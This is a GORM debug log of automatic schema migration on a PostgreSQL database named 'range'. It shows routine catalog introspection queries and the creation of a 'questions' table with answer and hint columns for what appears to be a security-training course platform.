[0m[33m[0.933ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.740ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.716ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.781ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.588ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.326ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.554ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'rooms'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.507ms] [34;1m[rows:-][0m SELECT * FROM "rooms" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[18.614ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.637ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.417ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'rooms'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.240ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.023ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.044ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.049ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.996ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.035ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.403ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'room_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.149ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.088ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'instructor_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.979ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND constraint_name = 'fk_rooms_instructor'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.808ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'rooms' AND indexname = 'idx_rooms_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.624ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.325ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.520ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.308ms] [34;1m[rows:-][0m SELECT * FROM "course_machines" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.188ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.613ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.549ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'course_machines'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.063ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.065ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.079ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.072ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.057ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.052ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.110ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'point') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.104ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'difficulty_level_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.889ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND constraint_name = 'fk_course_machines_difficulty_level'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.902ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'course_machines' AND indexname = 'idx_course_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.620ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.323ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.363ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'courses'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.628ms] [34;1m[rows:-][0m SELECT * FROM "courses" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.680ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'courses' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.999ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'courses'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.486ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'courses'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.040ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.010ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.058ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.158ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.045ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'content') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.213ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'room_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.142ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'course_machine_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.854ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND constraint_name = 'fk_courses_room'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.843ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND constraint_name = 'fk_courses_course_machine'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.717ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'courses' AND indexname = 'idx_courses_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.537ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[23.488ms] [34;1m[rows:0][0m CREATE TABLE "questions" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"question" text NOT NULL,"answer" text NOT NULL,"hint1" text,"hint2" text,"hint3" text,"point" bigint NOT NULL DEFAULT 1,"difficulty_level_id" bigint,"course_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_questions_difficulty_level" FOREIGN KEY ("difficulty_level_id") REFERENCES "difficulty_levels"("id"),CONSTRAINT "fk_questions_course" FOREIGN KEY ("course_id") REFERENCES "courses"("id"))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.765ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_questions_deleted_at" ON "questions" ("deleted_at")

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.672ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.353ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
